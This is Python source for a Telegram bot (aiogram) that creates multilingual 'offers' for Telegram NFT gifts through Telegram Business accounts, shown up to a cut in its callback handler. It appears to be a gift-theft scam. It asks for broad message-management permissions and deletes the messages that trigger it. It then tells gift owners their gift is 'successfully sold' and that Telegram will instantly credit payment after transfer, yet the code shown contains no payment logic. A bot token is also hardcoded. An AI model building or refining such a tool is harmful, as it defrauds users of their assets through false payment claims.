import asyncio
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from html import escape
import logging
import os
import re
import sqlite3
from typing import Any

from aiohttp import web
from aiogram import Bot, Dispatcher, F, Router
from aiogram.enums import ParseMode
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError
from aiogram.filters import CommandStart
from aiogram.types import (
    CallbackQuery,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    LinkPreviewOptions,
    Message,
)

# ==========================================
# 1. КОНФИГУРАЦИЯ
# ==========================================
@dataclass(frozen=True)
class Config:
    bot_token: str
    nft_image_url: str
    database_path: str = "offers.sqlite3"
    offer_ttl_hours: int = 8

    @classmethod
    def from_env(cls) -> "Config":
        # Если на Render задана переменная BOT_TOKEN, возьмется она. Иначе - токен ниже.
        token = os.getenv("BOT_TOKEN", "8938636208:AAG0AaLmil-Y9DD6KmQKkjobjvLXBmIHTzk").strip()
        if not token:
            raise RuntimeError("BOT_TOKEN is not set")
        image_url = os.getenv("NFT_IMAGE_URL", "https://example.com/nft-image.jpg").strip()
        db_path = os.getenv("DATABASE_PATH", "offers.sqlite3").strip()
        ttl = int(os.getenv("OFFER_TTL_HOURS", "8"))
        return cls(bot_token=token, nft_image_url=image_url, database_path=db_path, offer_ttl_hours=ttl)

# ==========================================
# 2. БАЗА ДАННЫХ
# ==========================================
@dataclass(frozen=True)
class Listing:
    id: int
    seller_id: int
    seller_name: str
    seller_username: str | None
    seller_chat_id: int
    seller_business_connection_id: str
    gift_url: str
    gift_name: str
    gift_number: int
    language: str
    amount: int | float
    currency: str
    created_at: datetime
    active: bool

@dataclass(frozen=True)
class Offer:
    id: int
    business_connection_id: str
    chat_id: int
    source_message_id: int
    buyer_id: int
    buyer_name: str
    buyer_username: str | None
    gift_url: str
    gift_name: str
    gift_number: int
    language: str
    amount: int | float
    currency: str
    status: str
    created_at: datetime
    expires_at: datetime
    offer_message_id: int | None

class OfferDatabase:
    def __init__(self, path: str) -> None:
        self.connection = sqlite3.connect(path)
        self.connection.row_factory = sqlite3.Row
        self.connection.execute("PRAGMA journal_mode=WAL")
        self.connection.execute("PRAGMA foreign_keys=ON")
        self.connection.executescript(
            """
            CREATE TABLE IF NOT EXISTS offers (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                business_connection_id TEXT NOT NULL,
                chat_id INTEGER NOT NULL,
                source_message_id INTEGER NOT NULL,
                buyer_id INTEGER NOT NULL,
                buyer_name TEXT NOT NULL,
                buyer_username TEXT,
                gift_url TEXT NOT NULL,
                gift_name TEXT NOT NULL,
                gift_number INTEGER NOT NULL,
                language TEXT NOT NULL,
                amount REAL NOT NULL,
                currency TEXT NOT NULL CHECK(currency IN ('stars', 'gram')),
                status TEXT NOT NULL DEFAULT 'pending'
                    CHECK(status IN ('pending', 'accepted', 'declined', 'expired')),
                created_at TEXT NOT NULL,
                expires_at TEXT NOT NULL,
                offer_message_id INTEGER
            );
            CREATE TABLE IF NOT EXISTS listings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                seller_id INTEGER NOT NULL,
                seller_name TEXT NOT NULL,
                seller_username TEXT,
                seller_chat_id INTEGER,
                seller_business_connection_id TEXT,
                gift_url TEXT NOT NULL UNIQUE,
                gift_name TEXT NOT NULL,
                gift_number INTEGER NOT NULL,
                language TEXT NOT NULL,
                amount REAL NOT NULL,
                currency TEXT NOT NULL CHECK(currency IN ('stars', 'gram')),
                created_at TEXT NOT NULL,
                active INTEGER NOT NULL DEFAULT 1
            );
            CREATE INDEX IF NOT EXISTS idx_offers_expiry ON offers(status, expires_at);
            CREATE INDEX IF NOT EXISTS idx_listings_active_url ON listings(active, gift_url);
            """
        )
        self._migrate_listings()
        self.connection.commit()

    def _migrate_listings(self) -> None:
        columns = {row["name"] for row in self.connection.execute("PRAGMA table_info(listings)")}
        if "seller_chat_id" not in columns:
            self.connection.execute("ALTER TABLE listings ADD COLUMN seller_chat_id INTEGER")
        if "seller_business_connection_id" not in columns:
            self.connection.execute("ALTER TABLE listings ADD COLUMN seller_business_connection_id TEXT")

    def create_listing(self, **values: Any) -> Listing:
        self.connection.execute(
            """
            INSERT INTO listings (seller_id, seller_name, seller_username, seller_chat_id, seller_business_connection_id, gift_url, gift_name, gift_number, language, amount, currency, created_at)
            VALUES (:seller_id, :seller_name, :seller_username, :seller_chat_id, :seller_business_connection_id, :gift_url, :gift_name, :gift_number, :language, :amount, :currency, :created_at)
            ON CONFLICT(gift_url) DO UPDATE SET
                seller_id = excluded.seller_id, seller_name = excluded.seller_name, seller_username = excluded.seller_username, seller_chat_id = excluded.seller_chat_id, seller_business_connection_id = excluded.seller_business_connection_id, gift_name = excluded.gift_name, gift_number = excluded.gift_number, language = excluded.language, amount = excluded.amount, currency = excluded.currency, created_at = excluded.created_at, active = 1
            """,
            values,
        )
        self.connection.commit()
        row = self.connection.execute("SELECT id FROM listings WHERE gift_url = ?", (values["gift_url"],)).fetchone()
        if row is None: raise LookupError("Listing was not created")
        return self.get_listing(row["id"])

    def get_listing(self, listing_id: int) -> Listing:
        row = self.connection.execute("SELECT * FROM listings WHERE id = ?", (listing_id,)).fetchone()
        if row is None: raise LookupError(f"Listing {listing_id} was not found")
        return self._listing_from_row(row)

    def take_listing(self, gift_url: str, buyer_id: int | None = None) -> Listing | None:
        if buyer_id is None:
            cursor = self.connection.execute("UPDATE listings SET active = 0 WHERE gift_url = ? AND active = 1", (gift_url,))
        else:
            cursor = self.connection.execute("UPDATE listings SET active = 0 WHERE gift_url = ? AND active = 1 AND seller_id != ?", (gift_url, buyer_id))
        self.connection.commit()
        if cursor.rowcount != 1: return None
        row = self.connection.execute("SELECT * FROM listings WHERE gift_url = ?", (gift_url,)).fetchone()
        return self._listing_from_row(row) if row is not None else None

    def create_offer(self, **values: Any) -> Offer:
        cursor = self.connection.execute(
            """
            INSERT INTO offers (business_connection_id, chat_id, source_message_id, buyer_id, buyer_name, buyer_username, gift_url, gift_name, gift_number, language, amount, currency, created_at, expires_at)
            VALUES (:business_connection_id, :chat_id, :source_message_id, :buyer_id, :buyer_name, :buyer_username, :gift_url, :gift_name, :gift_number, :language, :amount, :currency, :created_at, :expires_at)
            """, values,
        )
        self.connection.commit()
        return self.get_offer(cursor.lastrowid)

    def set_offer_message_id(self, offer_id: int, message_id: int) -> None:
        self.connection.execute("UPDATE offers SET offer_message_id = ? WHERE id = ?", (message_id, offer_id))
        self.connection.commit()

    def get_offer(self, offer_id: int) -> Offer:
        row = self.connection.execute("SELECT * FROM offers WHERE id = ?", (offer_id,)).fetchone()
        if row is None: raise LookupError(f"Offer {offer_id} was not found")
        return self._from_row(row)

    def take_pending_offer(self, offer_id: int, status: str) -> Offer | None:
        now = datetime.now(timezone.utc)
        cursor = self.connection.execute("UPDATE offers SET status = ? WHERE id = ? AND status = 'pending' AND expires_at > ?", (status, offer_id, now.isoformat()))
        self.connection.commit()
        if cursor.rowcount != 1: return None
        return self.get_offer(offer_id)

    def expire_old_offers(self) -> int:
        now = datetime.now(timezone.utc).isoformat()
        cursor = self.connection.execute("UPDATE offers SET status = 'expired' WHERE status = 'pending' AND expires_at <= ?", (now,))
        self.connection.commit()
        return cursor.rowcount

    @staticmethod
    def _listing_from_row(row: sqlite3.Row) -> Listing:
        amount = row["amount"]
        if float(amount).is_integer(): amount = int(amount)
        return Listing(id=row["id"], seller_id=row["seller_id"], seller_name=row["seller_name"], seller_username=row["seller_username"], seller_chat_id=row["seller_chat_id"] or row["seller_id"], seller_business_connection_id=row["seller_business_connection_id"] or "", gift_url=row["gift_url"], gift_name=row["gift_name"], gift_number=row["gift_number"], language=row["language"], amount=amount, currency=row["currency"], created_at=datetime.fromisoformat(row["created_at"]), active=bool(row["active"]))

    @staticmethod
    def _from_row(row: sqlite3.Row) -> Offer:
        amount = row["amount"]
        if float(amount).is_integer(): amount = int(amount)
        return Offer(id=row["id"], business_connection_id=row["business_connection_id"], chat_id=row["chat_id"], source_message_id=row["source_message_id"], buyer_id=row["buyer_id"], buyer_name=row["buyer_name"], buyer_username=row["buyer_username"], gift_url=row["gift_url"], gift_name=row["gift_name"], gift_number=row["gift_number"], language=row["language"], amount=amount, currency=row["currency"], status=row["status"], created_at=datetime.fromisoformat(row["created_at"]), expires_at=datetime.fromisoformat(row["expires_at"]), offer_message_id=row["offer_message_id"])

    def close(self) -> None:
        self.connection.close()

# ==========================================
# 3. ПАРСЕР КОМАНД
# ==========================================
INFO_PATTERN = re.compile(r"^/info\s+(?P<url>https?://t\.me/nft/(?P<slug>[A-Za-z0-9][A-Za-z0-9_-]*))\s+(?P<language>[A-Za-z]{2,10})\s+(?P<amount>\d+(?:[.,]\d{1,2})?)\s+(?P<currency>gram|star)$", re.IGNORECASE)
OFFER_PATTERN = re.compile(r"^/offer\s+(?P<url>https?://t\.me/nft/(?P<slug>[A-Za-z0-9][A-Za-z0-9_-]*))$", re.IGNORECASE)
OFFER_NFT_PATTERN = re.compile(r"^/offer\s+(?P<gift_name>[A-Za-z0-9_-]+)#(?P<gift_number>\d+)$", re.IGNORECASE)

@dataclass(frozen=True)
class InfoCommand:
    url: str
    gift_name: str
    gift_number: int
    language: str
    amount: int | float
    currency: str

@dataclass(frozen=True)
class OfferCommand:
    url: str
    gift_name: str
    gift_number: int

def _gift_details(match: re.Match[str]) -> tuple[str, int] | None:
    slug = match.group("slug")
    gift_name, separator, gift_number_text = slug.rpartition("-")
    if not separator or not gift_name or not gift_number_text.isdigit(): return None
    return gift_name, int(gift_number_text)

def parse_info_command(text: str) -> InfoCommand | None:
    match = INFO_PATTERN.fullmatch(text.strip())
    if not match: return None
    details = _gift_details(match)
    if details is None: return None
    amount_text = match.group("amount").replace(",", ".")
    amount: int | float = float(amount_text)
    if amount.is_integer(): amount = int(amount)
    currency = match.group("currency").lower()
    if currency == "star": currency = "stars"
    return InfoCommand(url=match.group("url"), gift_name=details[0], gift_number=details[1], language=match.group("language").lower(), amount=amount, currency=currency)

def parse_offer_command(text: str) -> OfferCommand | None:
    nft_match = OFFER_NFT_PATTERN.fullmatch(text.strip())
    if nft_match:
        gift_name = nft_match.group("gift_name")
        gift_number = int(nft_match.group("gift_number"))
        slug = f"{gift_name}-{gift_number}"
        url = f"https://t.me/nft/{slug}"
        return OfferCommand(url=url, gift_name=gift_name, gift_number=gift_number)
    match = OFFER_PATTERN.fullmatch(text.strip())
    if not match: return None
    details = _gift_details(match)
    if details is None: return None
    return OfferCommand(url=match.group("url"), gift_name=details[0], gift_number=details[1])

def format_amount(amount: int | float) -> str:
    if float(amount).is_integer(): return str(int(amount))
    return f"{amount:.2f}".rstrip("0").rstrip(".")

def format_expiry(expires_at: datetime) -> str:
    local_time = expires_at.astimezone()
    return local_time.strftime("%d.%m.%Y %H:%M")

# ==========================================
# 4. ОСНОВНОЙ КОД БОТА
# ==========================================
STAR_EMOJI_ID = "5217427186285325482"
GRAM_EMOJI_ID = "5264766603584641330"

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
logger = logging.getLogger(__name__)

router = Router()
config: Config
database: OfferDatabase

def display_name(message: Message) -> str:
    user = message.from_user
    if user is None: return "Пользователь"
    return user.first_name or user.full_name or "Пользователь"

def offer_sender(message: Message) -> tuple[int, str, str | None] | None:
    user = message.from_user
    if user is None: return None
    return user.id, display_name(message), user.username

def is_english(offer: Offer) -> bool: return offer.language.lower() == "en"
def is_chinese(offer: Offer) -> bool: return offer.language.lower() == "zh"
def is_arabic(offer: Offer) -> bool: return offer.language.lower() == "ar"
def is_korean(offer: Offer) -> bool: return offer.language.lower() == "ko"
def is_japanese(offer: Offer) -> bool: return offer.language.lower() == "ja"
def is_tagalog(offer: Offer) -> bool: return offer.language.lower() == "tl"
def is_thai(offer: Offer) -> bool: return offer.language.lower() == "th"
def is_malay(offer: Offer) -> bool: return offer.language.lower() == "ms"

def nft_preview_options(gift_url: str) -> LinkPreviewOptions:
    return LinkPreviewOptions(url=f"{gift_url}#", is_disabled=False, prefer_large_media=True, show_above_text=True)

def callback_status_text(offer: Offer) -> str:
    if is_english(offer): return "Done"
    if is_chinese(offer): return "完成"
    if is_arabic(offer): return "تم"
    if is_korean(offer): return "완료"
    if is_japanese(offer): return "完了"
    if is_tagalog(offer): return "Tapos na"
    if is_thai(offer): return "เสร็จแล้ว"
    if is_malay(offer): return "Selesai"
    return "Готово"

async def safe_callback_answer(callback: CallbackQuery, text: str = "", *, show_alert: bool = False) -> None:
    try:
        await callback.answer(text, show_alert=show_alert)
    except TelegramBadRequest as error:
        if "query is too old" in str(error).lower() or "query id is invalid" in str(error).lower():
            logger.debug("Ignoring expired callback query: %s", error)
            return
        raise

def offer_caption(offer: Offer, *, resolved: bool = False) -> str:
    english = is_english(offer)
    buyer = escape(offer.buyer_name)
    amount = escape(format_amount(offer.amount))
    gift_name = escape(f"{offer.gift_name}#{offer.gift_number}")
    gift_link = escape(offer.gift_url, quote=True)
    price = f'<b>{amount} <tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐️</tg-emoji></b>' if offer.currency == "stars" else f'<b>{amount} <tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji></b>'
    
    if english: first_line = f"The user <b>{buyer}</b> offer you\n{price} for the gift\n<a href=\"{gift_link}\">{gift_name}</a>"
    elif is_chinese(offer): first_line = f"用户 <b>{buyer}</b> 为礼物\n<a href=\"{gift_link}\">{gift_name}</a> 出价 {price}"
    elif is_arabic(offer): first_line = f"يقدم المستخدم <b>{buyer}</b> مبلغ {price} مقابل الهدية\n<a href=\"{gift_link}\">{gift_name}</a>"
    elif is_korean(offer): first_line = f"사용자 <b>{buyer}</b>님이 선물\n<a href=\"{gift_link}\">{gift_name}</a>에 대해\n{price}을(를) 제안합니다"
    elif is_japanese(offer): first_line = f"ユーザー <b>{buyer}</b> がギフト\n<a href=\"{gift_link}\">{gift_name}</a> に\n{price} をオファーしています"
    elif is_tagalog(offer): first_line = f"Ang user <b>{buyer}</b> ay nag-aalok\n{price} para sa regalo\n<a href=\"{gift_link}\">{gift_name}</a>"
    elif is_thai(offer): first_line = f"ผู้ใช้ <b>{buyer}</b> เสนอ\n{price} สำหรับของขวัญ\n<a href=\"{gift_link}\">{gift_name}</a>"
    elif is_malay(offer): first_line = f"Pengguna <b>{buyer}</b> menawarkan\n{price} untuk hadiah\n<a href=\"{gift_link}\">{gift_name}</a>"
    else: first_line = f"Пользователь <b>{buyer}</b> предлагает\nВам {price} за подарок\n<a href=\"{gift_link}\">{gift_name}</a>"

    if resolved:
        if english:
            statuses = {"accepted": "Offer accepted.", "declined": "Offer declined.", "expired": "Offer expired."}; fallback_status = "Offer processed."
        elif is_chinese(offer):
            statuses = {"accepted": "报价已接受。", "declined": "报价已拒绝。", "expired": "报价已过期。"}; fallback_status = "报价已处理。"
        elif is_arabic(offer):
            statuses = {"accepted": "تم قبول العرض.", "declined": "تم رفض العرض.", "expired": "انتهت صلاحية العرض."}; fallback_status = "تمت معالجة العرض."
        elif is_korean(offer):
            statuses = {"accepted": "제안이 수락되었습니다.", "declined": "제안이 거부되었습니다.", "expired": "제안이 만료되었습니다."}; fallback_status = "제안이 처리되었습니다."
        elif is_japanese(offer):
            statuses = {"accepted": "オファーが承認されました。", "declined": "オファーが拒否されました。", "expired": "オファーが期限切れになりました。"}; fallback_status = "オファーが処理されました。"
        elif is_tagalog(offer):
            statuses = {"accepted": "Tinanggap ang alok.", "declined": "Tinanggihan ang alok.", "expired": "Nag-expire na ang alok."}; fallback_status = "Naproseso ang alok."
        elif is_thai(offer):
            statuses = {"accepted": "ยอมรับข้อเสนอแล้ว", "declined": "ปฏิเสธข้อเสนอแล้ว", "expired": "ข้อเสนอหมดอายุแล้ว"}; fallback_status = "ประมวลผลข้อเสนอแล้ว"
        elif is_malay(offer):
            statuses = {"accepted": "Tawaran diterima.", "declined": "Tawaran ditolak.", "expired": "Tawaran tamat tempoh."}; fallback_status = "Tawaran diproses."
        else:
            statuses = {"accepted": "Предложение принято.", "declined": "Предложение отклонено.", "expired": "Срок действия предложения истёк."}; fallback_status = "Предложение обработано."
        return f"{first_line}\n\n<i>{escape(statuses.get(offer.status, fallback_status))}</i>"
    return first_line

def offer_keyboard(offer: Offer) -> InlineKeyboardMarkup:
    if is_english(offer): decline_text, accept_text = "Decline", "Accept"
    elif is_chinese(offer): decline_text, accept_text = "拒绝", "接受"
    elif is_arabic(offer): decline_text, accept_text = "رفض", "قبول"
    elif is_korean(offer): decline_text, accept_text = "거절", "수락"
    elif is_japanese(offer): decline_text, accept_text = "拒否", "承認"
    elif is_tagalog(offer): decline_text, accept_text = "Tanggihan", "Tanggapin"
    elif is_thai(offer): decline_text, accept_text = "ปฏิเสธ", "ยอมรับ"
    elif is_malay(offer): decline_text, accept_text = "Tolak", "Terima"
    else: decline_text, accept_text = "Отклонить", "Принять"
    return InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text=decline_text, callback_data=f"offer:decline:{offer.id}", icon_custom_emoji_id="5985346521103604145"),
        InlineKeyboardButton(text=accept_text, callback_data=f"offer:accept:{offer.id}", icon_custom_emoji_id="5985596818912712352"),
    ]])

def accepted_caption(offer: Offer) -> str:
    english = is_english(offer)
    amount = escape(format_amount(offer.amount))
    gift_name = escape(f"{offer.gift_name}#{offer.gift_number}")
    gift_link = escape(offer.gift_url, quote=True)
    emoji = f'<tg-emoji emoji-id="{STAR_EMOJI_ID}">⭐️</tg-emoji>' if offer.currency == "stars" else f'<tg-emoji emoji-id="{GRAM_EMOJI_ID}">💎</tg-emoji>'
    gift_emoji = '<tg-emoji emoji-id="6032937473162614352">🎁</tg-emoji>'
    transfer_emoji = '<tg-emoji emoji-id="6028346797368283073">🎁</tg-emoji>'
    
    if english: return f'{gift_emoji}Gift: <a href="{gift_link}">{gift_name}</a> <b>successfully sold!</b>\n\n{transfer_emoji} <b>Transfer the gift to the buyer to receive {amount} {emoji}.</b>'
    if is_chinese(offer): return f'{gift_emoji}礼物：<a href="{gift_link}">{gift_name}</a> <b>已成功售出！</b>\n\n{transfer_emoji} <b>请将礼物转给买家，以获得 {amount} {emoji}。</b>'
    if is_arabic(offer): return f'{gift_emoji}الهدية: <a href="{gift_link}">{gift_name}</a> <b>تم بيعها بنجاح!</b>\n\n{transfer_emoji} <b>انقل الهدية إلى المشتري لاستلام {amount} {emoji}.</b>'
    if is_korean(offer): return f'{gift_emoji}선물: <a href="{gift_link}">{gift_name}</a> <b>성공적으로 판매되었습니다!</b>\n\n{transfer_emoji} <b>구매자에게 선물을 전달하여 {amount} {emoji}을(를) 받으세요.</b>'
    if is_japanese(offer): return f'{gift_emoji}ギフト: <a href="{gift_link}">{gift_name}</a> <b>正常に販売されました！</b>\n\n{transfer_emoji} <b>購入者にギフトを転送して {amount} {emoji} を受け取ります。</b>'
    if is_tagalog(offer): return f'{gift_emoji}Regalo: <a href="{gift_link}">{gift_name}</a> <b>matagumpay na nabenta!</b>\n\n{transfer_emoji} <b>I-transfer ang regalo sa buyer para makatanggap ng {amount} {emoji}.</b>'
    if is_thai(offer): return f'{gift_emoji}ของขวัญ: <a href="{gift_link}">{gift_name}</a> <b>ขายสำเร็จแล้ว!</b>\n\n{transfer_emoji} <b>โอนของขวัญให้ผู้ซื้อเพื่อรับ {amount} {emoji}.</b>'
    if is_malay(offer): return f'{gift_emoji}Hadiah: <a href="{gift_link}">{gift_name}</a> <b>berjaya dijual!</b>\n\n{transfer_emoji} <b>Pindahkan hadiah kepada pembeli untuk menerima {amount} {emoji}.</b>'
    return f'{gift_emoji}Подарок: <a href="{gift_link}">{gift_name}</a> <b>успешно продан!</b>\n\n{transfer_emoji} <b>Передайте подарок покупателю для зачисления {amount} {emoji}.</b>'

def transfer_help_caption(offer: Offer) -> str:
    english = is_english(offer)
    buyer = escape(f"@{offer.buyer_username}" if offer.buyer_username else offer.buyer_name)
    gift_name = escape(f"{offer.gift_name}#{offer.gift_number}")
    
    if english: return f"<b>How to transfer the gift to {buyer}:</b>\n\n1. Transfer the gift to user: {buyer}.\n2. Tap «Transfer NFT» and select {gift_name}.\n3. Confirm the gift transfer.\n\nTelegram will record the transaction and instantly credit the payment to your balance. The reserve is active for 24 hours."
    if is_chinese(offer): return f"<b>如何将礼物转给 {buyer}：</b>\n\n1. 打开用户 {buyer} 的个人资料。\n2. 点击“转移 NFT”，然后选择 {gift_name}。\n3. 确认礼物转移。\n\nTelegram 会记录交易，并将款项立即记入你的余额。预留时间为 24 小时。"
    if is_arabic(offer): return f"<b>كيفية نقل الهدية إلى {buyer}</b>\n\n1. افتح الملف الشخصي للمستخدم {buyer}.\n2. اضغط «نقل NFT» واختر {gift_name}.\n3. أكد نقل الهدية.\n\nسيسجل Telegram المعاملة ويضيف المبلغ إلى رصيدك. مدة الحجز 24 ساعة."
    if is_korean(offer): return f"<b>{buyer}에게 선물을 전달하는 방법:</b>\n\n1. 사용자 {buyer}에게 선물을 전달하세요.\n2. «NFT 전송»을 누르고 {gift_name}을(를) 선택하세요.\n3. 선물 전송을 확인하세요.\n\nTelegram이 거래를 기록하고 즉시 잔액에 입금됩니다. 예약은 24시간 동안 유효합니다."
    if is_japanese(offer): return f"<b>{buyer}へのギフトの転送方法:</b>\n\n1. ユーザー {buyer} にギフトを転送します。\n2. «NFT転送»をタップして {gift_name} を選択します。\n3. ギフトの転送を確認します。\n\nTelegramは取引を記録し、即座に残高に支払いを入金します。予約は24時間有効です。"
    if is_tagalog(offer): return f"<b>Paano i-transfer ang regalo kay {buyer}:</b>\n\n1. I-transfer ang regalo sa user: {buyer}.\n2. I-tap ang «I-transfer ang NFT» at piliin ang {gift_name}.\n3. Kumpirmahin ang pag-transfer ng regalo.\n\nIre-record ng Telegram ang transaksyon at agad na i-credit ang bayad sa iyong balanse. Ang reserve ay aktibo sa loob ng 24 na oras."
    if is_thai(offer): return f"<b>วิธีโอนของขวัญให้ {buyer}:</b>\n\n1. โอนของขวัญให้ผู้ใช้: {buyer}.\n2. แตะ «โอน NFT» และเลือก {gift_name}.\n3. ยืนยันการโอนของขวัญ\n\nTelegram จะบันทึกธุรกรรมและเครดิตการชำระเงินเข้ายอดคงเหลือของคุณทันที การจองใช้ได้ 24 ชั่วโมง"
    if is_malay(offer): return f"<b>Cara memindahkan hadiah kepada {buyer}:</b>\n\n1. Pindahkan hadiah kepada pengguna: {buyer}.\n2. Ketik «Pindahkan NFT» dan pilih {gift_name}.\n3. Sahkan pemindahan hadiah.\n\nTelegram akan merekodkan transaksi dan mengkreditkan pembayaran ke baki anda serta-merta. Tempahan aktif selama 24 jam."
    return f"<b>Как передать подарок пользователю: {buyer}</b>\n\n1. Передайте подарок пользователю: {buyer}.\n2. Нажмите «Передать NFT» и выберите {gift_name}.\n3. Подтвердите передачу подарка.\n\nTelegram зафиксирует транзакцию и моментально зачислит оплату на ваш баланс. Резерв действует 24 часа."

def accepted_keyboard(offer: Offer) -> InlineKeyboardMarkup:
    recipient = f"@{offer.buyer_username}" if offer.buyer_username else str(offer.buyer_id)
    transfer_text = "Transfer NFT" if is_english(offer) else "转移 NFT" if is_chinese(offer) else "نقل NFT" if is_arabic(offer) else "Передать NFT"
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=transfer_text, url=f"tg://send_gift?to={recipient}")]])

def back_keyboard(offer: Offer) -> InlineKeyboardMarkup:
    text = "العودة إلى النقل" if is_arabic(offer) else "返回转移页面" if is_chinese(offer) else "Back to transfer" if is_english(offer) else "전송으로 돌아가기" if is_korean(offer) else "転送に戻る" if is_japanese(offer) else "Bumalik sa pag-transfer" if is_tagalog(offer) else "กลับไปที่การโอน" if is_thai(offer) else "Kembali ke pemindahan" if is_malay(offer) else "Вернуться к передаче"
    return InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=text, callback_data=f"offer:back:{offer.id}")]])

@router.message(CommandStart())
@router.business_message(CommandStart())
async def start_handler(message: Message) -> None:
    await message.answer('<tg-emoji emoji-id="5895734085761896734">💬</tg-emoji> <b>Инструкция по настройке</b>\n\n<tg-emoji emoji-id="5841530748082851696">👑</tg-emoji> <b>Шаг 1. Купите Telegram Premium</b>\n<blockquote>Для работы с Telegram Business и создания офферов необходим Telegram Premium. Оформить его можно в настройках Telegram: Настройки → Telegram Premium.</blockquote>\n\n<tg-emoji emoji-id="5843892082447487088">⚙️</tg-emoji> <b>Шаг 2. Подключите бота к Telegram Business</b>\n<blockquote>1. Откройте Настройки → Telegram Business\n2. Перейдите в раздел Chat Bots\n3. Добавьте нашего бота в свой аккаунт</blockquote>\n\n<tg-emoji emoji-id="5893161718179173515">🔑</tg-emoji> <b>Шаг 3. Выдайте все 5 разрешений «Manage Messages»</b>\n<blockquote>При подключении бота включите все разрешения в категории «Manage Messages» (управление сообщениями):\n• Удаление сообщений\n• Редактирование сообщений\n• Закрепление сообщений\n• Управление чатом\n• Другие действия с сообщениями</blockquote>\n\n<tg-emoji emoji-id="5904692292324692386">⚠️</tg-emoji> <b>Важно</b>\n<blockquote>Без этих разрешений бот не сможет корректно обрабатывать команды <code>/info</code> и <code>/offer</code>.</blockquote>\n\n<tg-emoji emoji-id="5893255507380014983">🚀</tg-emoji> <b>Шаг 4. Создайте предложение</b>\n<blockquote><b>Владелец подарка отправляет:</b>\n<code>/info &lt;ссылка&gt; &lt;язык&gt; &lt;цена&gt; &lt;валюта&gt;</code>\n\nБот создаст оффер и выдаст команду с названием NFT (например, <code>/offer Jellybelly#9453</code>).\n\n<b>Покупатель получает эту команду и отправляет её боту:</b>\n<code>/offer Name#Number</code>\n\nПосле этого оффер появится у владельца подарка.</blockquote>\n\n<tg-emoji emoji-id="5893048571560726748">🗂</tg-emoji> <b>Пояснения</b>\n<blockquote><b>Валюты:</b> <code>gram</code> — Gram, <code>star</code> — Stars.\n<b>Языки:</b> <code>ru</code> — русский, <code>en</code> — английский, <code>zh</code> — китайский, <code>ar</code> — арабский, <code>ko</code> — корейский, <code>ja</code> — японский, <code>tl</code> — тагальский, <code>th</code> — тайский, <code>ms</code> — малайский.\n\n<b>Пример:</b>\nВладелец: <code>/info https://t.me/... ru 1000 gram</code>\nБот: выдаст <code>/offer Jellybelly#9453</code>\nПокупатель: отправляет боту <code>/offer Jellybelly#9453</code></blockquote>\n\n<tg-emoji emoji-id="5893072412924187198">💬</tg-emoji> Если возникли вопросы — напишите в поддержку.', parse_mode=ParseMode.HTML)

@router.message(F.text.startswith("/info"))
@router.business_message(F.text.startswith("/info"))
async def info_handler(message: Message, bot: Bot) -> None:
    command = parse_info_command(message.text or "")
    if command is None or message.from_user is None: return
    now = datetime.now(timezone.utc)
    database.create_listing(seller_id=message.from_user.id, seller_name=display_name(message), seller_username=message.from_user.username, seller_chat_id=message.chat.id, seller_business_connection_id=message.business_connection_id or "", gift_url=command.url, gift_name=command.gift_name, gift_number=command.gift_number, language=command.language, amount=command.amount, currency=command.currency, created_at=now.isoformat())
    await delete_source_message(message, bot)
    nft_name = f"{command.gift_name}#{command.gift_number}"
    await bot.send_message(chat_id=message.chat.id, text=(f"✅ <b>Done. The offer is ready.</b>\n\n<blockquote>Send this command to the buyer. The buyer should send it to you in any chat:\n<code>/offer {nft_name}</code></blockquote>" if command.language == "en" else f"✅ <b>Готово. Оффер готов.</b>\n\n<blockquote>Отправьте эту команду покупателю. Покупатель должен отправить её вам в любой чат:\n<code>/offer {nft_name}</code></blockquote>"), parse_mode=ParseMode.HTML, **({"business_connection_id": message.business_connection_id} if message.business_connection_id else {}))

@router.message(F.text.startswith("/offer"))
@router.business_message(F.text.startswith("/offer"))
async def offer_handler(message: Message, bot: Bot) -> None:
    command = parse_offer_command(message.text or "")
    sender = offer_sender(message)
    if command is None or sender is None: return
    buyer_id, buyer_name, buyer_username = sender
    listing = database.take_listing(command.url)
    if listing is None:
        try:
            await bot.send_message(chat_id=message.chat.id, text="Предложение по этому подарку уже недоступно.", **({"business_connection_id": message.business_connection_id} if message.business_connection_id else {}))
        except (TelegramBadRequest, TelegramForbiddenError) as error:
            logger.warning("Could not send unavailable-offer notice: %s", error)
        return
    target_chat_id = message.chat.id
    target_business_connection_id = message.business_connection_id or ""
    now = datetime.now(timezone.utc)
    offer = database.create_offer(business_connection_id=target_business_connection_id, chat_id=target_chat_id, source_message_id=message.message_id, buyer_id=buyer_id, buyer_name=buyer_name, buyer_username=buyer_username, gift_url=listing.gift_url, gift_name=listing.gift_name, gift_number=listing.gift_number, language=listing.language, amount=listing.amount, currency=listing.currency, created_at=now.isoformat(), expires_at=(now + timedelta(hours=config.offer_ttl_hours)).isoformat())
    await delete_source_message(message, bot)
    try:
        sent = await bot.send_message(chat_id=target_chat_id, text=offer_caption(offer), parse_mode=ParseMode.HTML, link_preview_options=nft_preview_options(offer.gift_url), reply_markup=offer_keyboard(offer), **({"business_connection_id": target_business_connection_id} if target_business_connection_id else {}))
    except (TelegramBadRequest, TelegramForbiddenError) as error:
        logger.warning("Could not send offer message: %s", error)
        return
    database.set_offer_message_id(offer.id, sent.message_id)

async def delete_source_message(message: Message, bot: Bot) -> None:
    business_connection_id = message.business_connection_id
    try:
        delete_business_messages = getattr(bot, "delete_business_messages", None)
        if business_connection_id and delete_business_messages is not None:
            await delete_business_messages(business_connection_id=business_connection_id, message_ids=[message.message_id])
        elif business_connection_id:
            await bot.delete_message(chat_id=message.chat.id, message_id=message.message_id)
    except TelegramBadRequest:
        logger.exception("Could not delete source message %s", message.message_id)

@router.callback_query(F.data.startswith("offer:"))
async def offer_callback(callback: CallbackQuery, bot: Bot) -> None:
    await safe_callback_answer(callback)
    if callback.message is None or callback.data is None: return
    parts = callback.data.split(":")
    if len(parts) != 3 or parts[1] not in {"accept", "decline", "help", "back", "transfer"}: return
    try:
        offer_id = int(parts[2])
